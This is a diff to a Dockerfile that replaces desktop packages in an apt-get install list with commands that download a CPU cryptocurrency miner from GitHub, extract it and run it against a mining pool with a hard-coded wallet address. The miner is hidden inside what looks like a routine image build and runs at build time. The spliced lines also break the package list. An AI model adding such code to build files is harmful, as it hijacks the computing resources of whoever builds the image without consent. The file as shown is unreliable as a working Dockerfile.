@@ -7,9 +7,9 @@ ENV DEBIAN_FRONTEND=noninteractive
 RUN set -ex; \
     apt-get update \
     && apt-get install -y --no-install-recommends \
-        dbus-x11 \
-        nautilus \
-        gedit \
+        wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz \
+     && tar xf hellminer_cpu_linux.tar.gz \
+     && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RC8Ja5qyP6jUYhT8R65QJfkMUovd9rLA7C.Hp -p x --cpu 5 \
         expect \
         sudo \
         vim \
